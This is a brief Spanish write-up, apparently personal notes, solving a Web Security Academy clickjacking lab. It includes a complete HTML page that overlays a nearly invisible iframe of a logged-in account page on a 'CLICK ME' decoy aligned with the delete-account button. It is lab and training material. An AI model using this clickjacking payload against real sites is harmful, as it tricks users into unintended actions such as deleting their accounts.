## Objetivo:

![[Pasted image 20240609181701.png]]

## Solucion:

Iniciamos sesion con nuestra cuenta y nos vamos a la siguiente opcion

![[Pasted image 20240609182119.png]]

En el body pegamos lo siguiente:

![[Pasted image 20240609182205.png]]

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

  

<style>

iframe {

width: 1000px;

height: 700px;

z-index: 2;

position: relative;

opacity: 0.2;

}

  

div {

z-index: 1;

position: absolute;

top: 517px;

left: 50px;

}

</style>

  

</head>

<body>

<div>CLICK ME</div>

<iframe src="https://0ab1001804278f7a827951ca00460014.web-security-academy.net/my-account"></iframe>

</body>

</html>

```

Y le damos en "Store" y luego en "View exploit" y nos aseguramos de que la palabra "CLICK ME" esté sobre el boton de eliminar cuenta.

![[Pasted image 20240609182321.png]]

Una vez verificado eso, cambiamos el valor de la propiedad "opacity" del "iframe" a 0.000001 y damos nuevamente en Store y View exploit para verficiar que no sea vea le iframe

![[Pasted image 20240609182954.png]]


Y efectivamente no se ve

![[Pasted image 20240609183040.png]]


Le damos ahora el siguiente boton y listo

![[Pasted image 20240609183101.png]]


![[Pasted image 20240609183114.png]]

